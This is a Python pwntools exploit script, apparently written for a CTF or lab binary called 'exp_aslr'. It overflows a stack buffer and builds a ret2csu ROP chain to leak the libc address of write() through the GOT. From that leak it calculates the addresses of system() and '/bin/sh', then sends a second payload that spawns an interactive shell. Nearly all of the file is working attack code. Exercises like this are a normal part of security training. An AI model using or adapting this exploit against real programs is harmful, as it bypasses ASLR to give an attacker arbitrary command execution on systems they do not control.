from pwn import *

#p = remote('127.0.0.1',8888) 
p = process('./exp_aslr/exp_aslr')

libc = ELF('./exp_aslr/libc.so')
elf = ELF('./exp_aslr/exp_aslr')

plt_write = elf.symbols['write']
print 'plt_write= ' + hex(plt_write)
got_write = elf.got['write']
print 'got_write= ' + hex(got_write)
vulfun_addr = 0x40054c
print 'vulfun= ' + hex(vulfun_addr)

rsp=0x400616
rsp_8=0x0 #==>rbx
rsp_10=0x0  #==>rbp
rsp_18=got_write  #==>r12!!!!
rsp_20=0x1 #==>edi
rsp_28=got_write #==>rsi
rsp_30=0x8 #==>rdx
rsp_38=0x400600 #==>ret


payload1=''
payload1+='a'*136+p64(rsp)+p64(0x0)#useless
payload1+=p64(rsp_8)+p64(rsp_10)+p64(rsp_18)+p64(rsp_20)+p64(rsp_28)+p64(rsp_30)+p64(rsp_38)
payload1+='a'*int(0x38)#useless
payload1+=p64(vulfun_addr)

raw_input('input:')

print "\n###sending payload1 ...###"
p.send(payload1)
 
print "\n###receving write() addr...###"
write_addr = u64(p.recv(8))
print 'write_addr=' + hex(write_addr)


print "\n###calculating system() addr and \"/bin/sh\" addr...###"
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
print 'system_addr= ' + hex(system_addr)
binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
print 'binsh_addr= ' + hex(binsh_addr)

poprdi = 0x00007ffff7b3e6af
write = 0x7ffff7b21770
pRop = write_addr + (poprdi - write)
print 'poprdi_addr= ' + hex(pRop)

payload2 = 'a'*136  + p64(pRop) + p64(binsh_addr) + p64(system_addr)

print "\n###sending payload2 ...###"
p.send(payload2)
p.interactive()
